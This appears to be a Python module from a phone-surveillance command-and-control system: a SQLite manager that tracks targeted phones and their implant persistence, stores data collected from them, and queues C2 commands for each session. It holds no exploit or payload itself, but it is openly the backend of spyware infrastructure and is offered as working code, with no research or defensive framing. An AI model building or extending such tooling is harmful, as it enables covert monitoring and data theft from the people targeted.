import sqlite3
import json
import os
import datetime
import logging
from contextlib import contextmanager
from core.config_manager import ConfigManager

class DatabaseManager:
    def __init__(self, config_manager: ConfigManager):
        self.config = config_manager
        self.db_path = self.config.get('database.path', 'data/surveillance.db')
        self.logger = logging.getLogger(__name__)

    @contextmanager
    def _get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        yield conn
        conn.close()

    def initialize(self):
        if not os.path.exists(os.path.dirname(self.db_path)):
            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)

    def create_tables(self):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                target_phone TEXT,
                target_os TEXT,
                target_app TEXT,
                status TEXT,
                persistence_level TEXT,
                created_at TEXT,
                last_activity TEXT,
                ip_address TEXT,
                user_agent TEXT,
                metadata TEXT
            )
            ''')

            cursor.execute('''
            CREATE TABLE IF NOT EXISTS collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                data_type TEXT,
                payload TEXT,
                timestamp TEXT,
                metadata TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
            ''')

            cursor.execute('''
            CREATE TABLE IF NOT EXISTS c2_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                command TEXT,
                args TEXT,
                status TEXT,
                created_at TEXT,
                updated_at TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
            ''')
            
            conn.commit()

    def insert_session(self, session_data: dict):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO sessions (session_id, target_phone, target_os, target_app, status, persistence_level, created_at, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                session_data['session_id'],
                session_data.get('target_phone'),
                session_data.get('target_os'),
                session_data.get('target_app'),
                session_data.get('status', 'active'),
                session_data.get('persistence_level'),
                session_data.get('created_at', datetime.datetime.now().isoformat()),
                json.dumps({k:v for k,v in session_data.items() if k not in ['session_id', 'created_at']})
            ))
            conn.commit()

    def update_session(self, session_id: str, updates: dict):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
            values = list(updates.values()) + [session_id]
            cursor.execute(f"UPDATE sessions SET {set_clause} WHERE session_id = ?", values)
            conn.commit()

    def get_session(self, session_id: str):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
            result = cursor.fetchone()
            return dict(result) if result else None

    def get_active_sessions(self) -> list:
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions WHERE status = 'active'")
            return [dict(row) for row in cursor.fetchall()]

    def get_pending_commands(self, session_id):
        """Get pending commands for a session"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT id, command, args, created_at FROM c2_commands
                    WHERE session_id = ? AND status = 'pending'
                    ORDER BY created_at ASC
                """, (session_id,))

                rows = cursor.fetchall()
                commands = []
                for row in rows:
                    commands.append({
                        'id': row[0],
                        'command': row[1],
                        'args': json.loads(row[2]) if row[2] else None,
                        'created_at': row[3]
                    })

                return commands
        except Exception as e:
            self.logger.error(f"Error getting pending commands: {e}")
            return []

    def update_command_status(self, command_id, status):
        """Update command status"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    UPDATE c2_commands
                    SET status = ?, updated_at = ?
                    WHERE id = ?
                """, (status, datetime.datetime.now().isoformat(), command_id))
            
                conn.commit()
                return True
        except Exception as e:
            self.logger.error(f"Error updating command status: {e}")
            return False

    def insert_collected_data(self, session_id, data_type, payload, metadata=None):
        """Insert collected data into the database"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO collected_data
                    (session_id, data_type, payload, metadata, timestamp)
                    VALUES (?, ?, ?, ?, ?)
                """, (
                    session_id,
                    data_type,
                    payload,
                    json.dumps(metadata) if metadata else None,
                    datetime.datetime.now().isoformat()
                ))
            
                conn.commit()
                return cursor.lastrowid
        except Exception as e:
            self.logger.error(f"Error inserting collected data: {e}")
            return None

    def get_collected_data(self, session_id, data_type=None, limit=100):
        """Get collected data for a session"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
            
                if data_type:
                    cursor.execute("""
                        SELECT id, data_type, payload, metadata, timestamp
                        FROM collected_data
                        WHERE session_id = ? AND data_type = ?
                        ORDER BY timestamp DESC
                        LIMIT ?
                    """, (session_id, data_type, limit))
                else:
                    cursor.execute("""
                        SELECT id, data_type, payload, metadata, timestamp
                        FROM collected_data
                        WHERE session_id = ?
                        ORDER BY timestamp DESC
                        LIMIT ?
                    """, (session_id, limit))
            
                rows = cursor.fetchall()
                data = []
                for row in rows:
                    data.append({
                        'id': row[0],
                        'data_type': row[1],
                        'payload': row[2],
                        'metadata': json.loads(row[3]) if row[3] else None,
                        'timestamp': row[4]
                    })
            
                return data
        except Exception as e:
            self.logger.error(f"Error getting collected data: {e}")
            return []

    def check_connection(self):
        """Check database connection"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT 1")
                return True
        except Exception:
            return False

    def get_data_stats(self):
        """Get data statistics"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
             
                # Get total sessions
                cursor.execute("SELECT COUNT(*) FROM sessions")
                total_sessions = cursor.fetchone()[0]
            
                # Get active sessions
                cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
                active_sessions = cursor.fetchone()[0]
            
                # Get total data records
                cursor.execute("SELECT COUNT(*) FROM collected_data")
                total_data = cursor.fetchone()[0]
            
                # Get data by type
                cursor.execute("SELECT data_type, COUNT(*) FROM collected_data GROUP BY data_type")
                data_by_type = dict(cursor.fetchall())
            
                return {
                    'total_sessions': total_sessions,
                    'active_sessions': active_sessions,
                    'total_data_records': total_data,
                    'data_by_type': data_by_type
                }
        except Exception as e:
            self.logger.error(f"Error getting data stats: {str(e)}")
            return {}

    def get_data_by_type(self, session_id, data_type):
        """Get data by type for a session"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT id, data_type, payload, metadata, timestamp
                    FROM collected_data
                    WHERE session_id = ? AND data_type = ?
                    ORDER BY timestamp DESC
                """, (session_id, data_type))
            
                rows = cursor.fetchall()
                data = []
                for row in rows:
                    data.append({
                        'id': row[0],
                        'data_type': row[1],
                        'payload': row[2],
                        'metadata': json.loads(row[3]) if row[3] else None,
                        'timestamp': row[4]
                    })
            
                return data
        except Exception as e:
            self.logger.error(f"Error getting data by type: {str(e)}")
            return []

    def get_all_session_data(self, session_id):
        """Get all data for a session"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT id, data_type, payload, metadata, timestamp
                    FROM collected_data
                    WHERE session_id = ?
                    ORDER BY timestamp DESC
                """, (session_id,))
            
                rows = cursor.fetchall()
                data = []
                for row in rows:
                    data.append({
                        'id': row[0],
                        'data_type': row[1],
                        'payload': row[2],
                        'metadata': json.loads(row[3]) if row[3] else None,
                        'timestamp': row[4]
                    })
            
                return data
        except Exception as e:
            self.logger.error(f"Error getting all session data: {str(e)}")
            return []

    def purge_data(self, session_id=None, data_type=None, older_than=None):
        """Purge collected data"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
            
                query = "DELETE FROM collected_data WHERE 1=1"
                params = []
            
                if session_id:
                    query += " AND session_id = ?"
                    params.append(session_id)
                
                if data_type:
                    query += " AND data_type = ?"
                    params.append(data_type)
                
                if older_than:
                    query += " AND timestamp < ?"
                    params.append(older_than)
                
                cursor.execute(query, params)
                conn.commit()
            
                return cursor.rowcount
        except Exception as e:
            self.logger.error(f"Error purging data: {str(e)}")
            return 0

    def get_total_sessions(self):
        """Get total number of sessions"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM sessions")
                return cursor.fetchone()[0]
        except Exception as e:
            self.logger.error(f"Error getting total sessions: {str(e)}")
            return 0

    def get_expired_sessions(self):
        """Get expired sessions"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()

                # Get session timeout from config
                session_timeout = self.config.get('c2.session_timeout', 3600)  # Default 1 hour
            
                # Calculate expiration time
                expiration_time = (datetime.datetime.now() - 
                                  datetime.timedelta(seconds=session_timeout)).isoformat()
            
                cursor.execute("""
                    SELECT session_id FROM sessions 
                    WHERE last_activity < ? AND status = 'active'
                """, (expiration_time,))
            
                rows = cursor.fetchall()
                return [{'session_id': row[0]} for row in rows]
        except Exception as e:
            self.logger.error(f"Error getting expired sessions: {str(e)}")
            return []

    def remove_session(self, session_id):
        """Remove a session"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
            
                # Update session status to expired
                cursor.execute("""
                    UPDATE sessions SET status = 'expired'
                    WHERE session_id = ?
                """, (session_id,))
            
                # Remove pending commands
                cursor.execute("""
                    DELETE FROM c2_commands WHERE session_id = ?
                """, (session_id,))
             
                conn.commit()
                return True
        except Exception as e:
            self.logger.error(f"Error removing session: {str(e)}")
            return False

    def add_command(self, session_id, command, args=None):
        """Add a command for a session"""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO c2_commands (session_id, command, args, status, created_at)
                    VALUES (?, ?, ?, 'pending', ?)
                """, (session_id, command, json.dumps(args) if args else None, 
                      datetime.datetime.now().isoformat()))
            
                conn.commit()
                return cursor.lastrowid
        except Exception as e:
            self.logger.error(f"Error adding command: {str(e)}")
            return None

    def close(self):
        """Close database connections and cleanup resources"""
        # Since we're using context managers for connections, 
        # there might not be persistent connections to close
        self.logger.info("Database connections closed")
